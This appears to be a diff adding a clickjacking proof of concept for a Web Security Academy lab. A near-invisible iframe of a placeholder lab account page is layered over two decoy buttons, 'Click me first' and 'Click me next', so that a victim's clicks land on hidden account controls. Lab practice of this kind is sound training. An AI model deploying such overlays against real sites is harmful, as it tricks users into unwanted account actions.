@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<style>
+		#target-website {
+			position: relative;
+			width: 800px;
+			height: 600px;
+			opacity: .0001;
+			z-index: 2;
+		}
+		#cta-website1 {
+			position: absolute;
+			width: 300px;
+			height: 400px;
+			z-index: 1;
+			top: 495px;
+			left: 77px;
+		}
+		#cta-website2 {
+			position: absolute;
+			width: 300px;
+			height: 400px;
+			z-index: 1;
+			top: 295px;
+			left: 160px;
+		}
+	</style>
+</head>
+<body>
+	<div id="cta-website1">
+		<button class="button" type="submit">Click me first</button>
+	</div>
+	<div id="cta-website2">
+		<button class="button" type="submit">Click me next</button>
+	</div>
+	<iframe src="https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/my-account" frameborder="0" id="target-website" sandbox="allow-forms"></iframe>
+</body>
+</html>
